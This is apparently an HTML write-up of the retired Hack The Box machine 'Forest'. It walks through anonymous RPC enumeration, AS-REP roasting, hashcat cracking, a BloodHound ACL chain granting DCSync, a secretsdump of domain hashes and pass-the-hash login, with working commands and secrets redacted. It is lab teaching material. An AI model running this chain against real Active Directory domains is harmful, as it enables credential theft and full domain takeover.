@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Forest &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Forest</h1>
+    <div class="meta">Target: <code>10.10.10.161</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">RPC</span><span class="tag">ASREPRoast</span><span class="tag">hashcat</span><span class="tag">BloodHound</span><span class="tag">DCSync</span><span class="tag">secretsdump</span><span class="tag">WinRM</span><span class="tag">ACLAbuse</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#as-rep-roasting-svc-alfresco">AS-REP Roasting svc-alfresco</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#bloodhound-acl-chain-dcsync">BloodHound → ACL Chain → DCSync</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Forest is an easy but iconic Active Directory box that teaches the canonical attack path: enumerate users over RPC, <strong>AS-REP roast</strong> an account that doesn't require Kerberos pre-authentication, crack it, then use <strong>BloodHound</strong> to find an ACL chain that ends in <strong>DCSync</strong>. Dumping the domain hashes and passing the Administrator hash finishes it. If you learn one AD box, it's this one.</p>
+<blockquote>
+<p><strong>Screenshot would help here:</strong> the pivot is reading BloodHound's "Shortest Path to Domain Admins" graph. A screenshot of that graph, svc-alfresco → Account Operators → Exchange Windows Permissions → DCSync, would convey the privesc logic far better than text.</p>
+</blockquote>
+<h2 id="recon">Recon</h2>
+<p>SMB null sessions gave nothing, so I moved to RPC, which allowed an anonymous bind and full user/group enumeration:</p>
+<pre><code class="language-sh">rpcclient -U &quot;&quot; -N 10.10.10.161
+rpcclient $&gt; enumdomusers
+... svc-alfresco ... sebastien ... lucinda ... andy ... mark ...
+</code></pre>
+<blockquote>
+<p><strong>Why RPC first:</strong> an anonymous RPC bind on a DC frequently leaks the entire user list even when SMB shares are locked down. That list is the raw material for AS-REP roasting and password spraying.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="as-rep-roasting-svc-alfresco">AS-REP Roasting svc-alfresco</h3>
+<p>I asked the KDC for AS-REP tickets for every user, with no password:</p>
+<pre><code class="language-sh">for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user}; done
+</code></pre>
+<p>Only <code>svc-alfresco</code> returned a hash:</p>
+<pre><code>$krb5$‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>What AS-REP roasting is:</strong> normally Kerberos requires <em>pre-authentication</em>, you prove you know the password before the KDC sends anything crackable. If an account has "Do not require Kerberos preauthentication" set, the KDC will hand out an AS-REP encrypted with that account's password hash to <em>anyone who asks</em>. That's an offline-crackable blob requiring zero credentials.</p>
+</blockquote>
+<p>hashcat cracked it (mode 18200):</p>
+<pre><code class="language-sh">hashcat -m 18200 svc-alfresco.kerb rockyou.txt
+-&gt;  svc-alfresco : ‹redacted›
+</code></pre>
+<p>Those credentials gave a WinRM shell.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="bloodhound-acl-chain-dcsync">BloodHound → ACL Chain → DCSync</h3>
+<p>I ran SharpHound and pulled the data into BloodHound. The shortest path to Domain Admins was an ACL chain:</p>
+<blockquote>
+<p><code>svc-alfresco</code> → <strong>Account Operators</strong> → <strong>GenericAll</strong> on the <strong>Exchange Windows Permissions</strong> group → that group holds <strong>WriteDacl</strong> on the domain object → grant myself <strong>DCSync</strong>.</p>
+</blockquote>
+<p>The "Exchange Windows Permissions" group can modify the domain's DACL, which lets me give my own account replication (DCSync) rights. First I added myself to the group, then granted DCSync:</p>
+<pre><code class="language-powershell">net group &quot;Exchange Windows Permissions&quot; svc-alfresco /add /domain
+Add-DomainObjectAcl -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+</code></pre>
+<blockquote>
+<p><strong>What DCSync does:</strong> replication rights let an account ask the DC to "replicate" account secrets, effectively the same request a backup DC makes. With it, <code>secretsdump</code> pulls every hash in the domain, including the KRBTGT and Administrator, without ever touching the DC's disk.</p>
+</blockquote>
+<pre><code class="language-sh">impacket-secretsdump svc-alfresco@10.10.10.161
+htb.local\Administrator:500:aad3b435...:‹redacted›:::
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Pass-the-hash as Administrator:</p>
+<pre><code class="language-sh">evil-winrm -i 10.10.10.161 -u administrator -H ‹redacted›
+C:\&gt;whoami
+htb\administrator
+</code></pre>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Anonymous RPC enumeration</strong> seeds the whole attack, get the user list first.</li>
+<li><strong>AS-REP roasting needs no credentials</strong>; any account missing pre-auth is free offline cracking.</li>
+<li><strong>BloodHound turns ACLs into attack paths.</strong> The Account Operators → Exchange Windows Permissions → DCSync chain is a well-known route from a low-priv user to full domain compromise.</li>
+<li><strong>DCSync = game over.</strong> Replication rights dump every hash; pass-the-hash then logs in as Administrator.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
